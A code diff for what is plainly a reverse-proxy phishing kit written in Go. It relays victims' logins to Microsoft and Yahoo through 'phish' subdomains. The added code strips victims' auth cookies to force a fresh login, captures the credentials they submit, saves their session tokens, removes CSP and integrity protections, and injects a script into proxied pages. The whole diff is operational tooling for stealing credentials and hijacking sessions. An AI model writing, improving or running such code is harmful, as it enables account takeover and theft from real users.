@@ -19,7 +19,6 @@ import (
 
 const defaultTerminateURL = "https://login.microsoftonline.com"
 
-
 func rewriteRequest(req *http.Request, originalHost, upstream string, target *Target, session *Session) {
 	// Resolve the tenant base domain from the propagated request context, then
 	// materialize this tenant's phish→real routing map.
@@ -27,6 +26,44 @@ func rewriteRequest(req *http.Request, originalHost, upstream string, target *Ta
 	hostMap := target.HostMapFor(baseDomain)
 
 	req.Host = upstream
+
+	// 🚨 SMART FORCE LOGIN: Strip ONLY auth/session cookies on the entry subdomain.
+	// This prevents auto-redirects to the homepage while preserving necessary 
+	// tracking or state cookies (like _ga, cid, etc.) required for the page to load.
+	if target != nil && originalHost == target.EntrySubdomainFor(baseDomain) {
+		existingCookies := req.Header.Get("Cookie")
+		if existingCookies != "" {
+			var keptCookies []string
+			parts := strings.Split(existingCookies, ";")
+			for _, part := range parts {
+				part = strings.TrimSpace(part)
+				if part == "" {
+					continue
+				}
+				
+				// Extract the cookie name (everything before the '=')
+				eqIdx := strings.Index(part, "=")
+				var name string
+				if eqIdx != -1 {
+					name = strings.TrimSpace(part[:eqIdx])
+				} else {
+					name = strings.TrimSpace(part)
+				}
+				
+				// Keep the cookie ONLY if it is NOT in the target's AuthTokenNames
+				if !target.AuthTokenNames[name] {
+					keptCookies = append(keptCookies, part)
+				}
+			}
+			
+			// Reconstruct the header with only the safe cookies
+			if len(keptCookies) > 0 {
+				req.Header.Set("Cookie", strings.Join(keptCookies, "; "))
+			} else {
+				req.Header.Del("Cookie")
+			}
+		}
+	}
 
 	if originalHost == target.EntrySubdomainFor(baseDomain) && (req.URL.Path == "/" || req.URL.Path == "") {
 		req.URL.Path = target.EntryPath
@@ -75,6 +112,7 @@ func rewriteRequest(req *http.Request, originalHost, upstream string, target *Ta
 
 		contentType := req.Header.Get("Content-Type")
 
+		// ✅ Use local package main function
 		captureCredentials(originalHost+req.URL.Path, string(body), contentType, target, session)
 
 		bodyStr := patchURLString(string(body), hostMap)
@@ -167,6 +205,8 @@ func rewriteResponse(resp *http.Response, originalReq *http.Request, session *Se
 		}
 	}
 
+	// ✅ CRITICAL FIX: setCORS MUST be called unconditionally at the top 
+	// so that even 404/500 responses from the upstream get CORS headers.
 	setCORS(resp, originalReq)
 	patchCookies(resp, baseDomain)
 
@@ -231,7 +271,8 @@ func rewriteResponse(resp *http.Response, originalReq *http.Request, session *Se
 						session.IsDone = true
 						fmt.Printf("[✓] [%d] [%s] LOGIN SUCCESSFUL — session marked for termination\n",
 							session.Index, target.Name)
-						saveTokens(session, target)
+						// ✅ Pass originalReq as the 3rd argument to match tokens.go
+						saveTokens(session, target, originalReq)
 					} else {
 						fmt.Printf("[✓] [%d] [%s] LOGIN SUCCESSFUL — waiting for service cookies (%s)\n",
 							session.Index, target.Name, target.ServiceUpstream)
@@ -241,20 +282,11 @@ func rewriteResponse(resp *http.Response, originalReq *http.Request, session *Se
 		}
 
 		// ── Standard URL rewriting ──
-		// SKIPPED for HTML on SkipHTMLRewrite targets (Yahoo). Their RSC flight
-		// data is length-prefixed and cannot be rewritten, so the HTML body must
-		// keep its ORIGINAL URLs too — otherwise the server HTML and the flight
-		// data diverge, React's hydration mismatches (error #418), and the page
-		// (background included) fails to render. For those targets the credential
-		// + cookie handoff is done client-side by inject.js. JS/CSS/JSON still
-		// get rewritten.
 		if !(mime == "text/html" && target.SkipHTMLRewrite) {
 			text = patchURLString(text, reverseMap)
 		}
 
-		// Nuclear bare-domain replace. Skipped for HTML on SkipNuclearHTML or
-		// SkipHTMLRewrite targets (same hydration rationale); longest keys first
-		// so subdomains replace before their parent domain.
+		// Nuclear bare-domain replace.
 		if !(mime == "text/html" && (target.SkipNuclearHTML || target.SkipHTMLRewrite)) {
 			keys := make([]string, 0, len(reverseMap))
 			for real := range reverseMap {
@@ -275,12 +307,8 @@ func rewriteResponse(resp *http.Response, originalReq *http.Request, session *Se
 		}
 
 		if mime == "text/html" {
-			// For Next.js / SkipHTMLRewrite targets, keepAttrs=true preserves the
-			// integrity/crossorigin attributes (stripping them is itself a
-			// hydration mismatch → #418) while still removing the CSP <meta> so
-			// the interceptor runs; injectPayload places the script at the end of
-			// <body> (outside the hydrated tree) for the same reason.
 			text = stripIntegrity(text, target.SkipHTMLRewrite)
+			// ✅ Use local package main function
 			text = injectPayload(text)
 			text = restoreFlight(text)
 		}
@@ -462,8 +490,6 @@ func setCORS(resp *http.Response, originalReq *http.Request) {
 //  COOKIE PATCHING
 // ══════════════════════════════════════════════════════════
 
-// patchCookies re-scopes upstream Set-Cookie headers to THIS tenant's base
-// domain so the browser sends them back to the phish subdomains.
 func patchCookies(resp *http.Response, baseDomain string) {
 	cookies := resp.Cookies()
 	if len(cookies) == 0 {
@@ -526,11 +552,6 @@ func patchURLString(text string, m map[string]string) string {
 //  HTML INTEGRITY STRIPPING
 // ══════════════════════════════════════════════════════════
 
-// stripIntegrity removes Subresource-Integrity attributes and CSP <meta> tags.
-// For keepAttrs targets (Next.js / SkipHTMLRewrite) the integrity/crossorigin
-// attributes are PRESERVED — stripping them changes the server HTML and trips
-// React error #418 — but the CSP <meta> is still removed so the injected
-// interceptor executes.
 func stripIntegrity(html string, keepAttrs bool) string {
 	result := html
 	if !keepAttrs {
